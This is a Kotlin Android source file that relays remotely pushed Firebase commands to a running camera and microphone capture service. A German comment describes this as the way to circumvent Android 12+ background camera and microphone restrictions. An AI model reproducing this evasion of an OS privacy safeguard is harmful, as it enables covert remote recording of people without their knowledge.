package com.ikianti.app.service

import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.ikianti.app.DeviceManager
import com.ikianti.app.SupabaseApi

/**
 * Empfängt FCM-Befehle und leitet sie per lokalem Broadcast
 * an den bereits laufenden CaptureForegroundService weiter.
 *
 * Kein neuer Service-Start aus dem Hintergrund – das ist der Schlüssel
 * zur Umgehung der Android 12+ Kamera/Mikro-Hintergrund-Einschränkung.
 */
class FcmTriggerService : FirebaseMessagingService() {

    override fun onMessageReceived(message: RemoteMessage) {
        val command = message.data["command"] ?: return
        Log.d("FcmTriggerService", "Befehl empfangen: $command")

        // Broadcast an den laufenden persistenten Service senden
        CaptureForegroundService.sendCommand(this, command)
    }

    override fun onNewToken(token: String) {
        val deviceId = DeviceManager.getDeviceId(this)
        Log.d("FcmTriggerService", "FCM-Token erneuert für $deviceId")
        SupabaseApi.updateFcmToken(deviceId, token)
    }
}
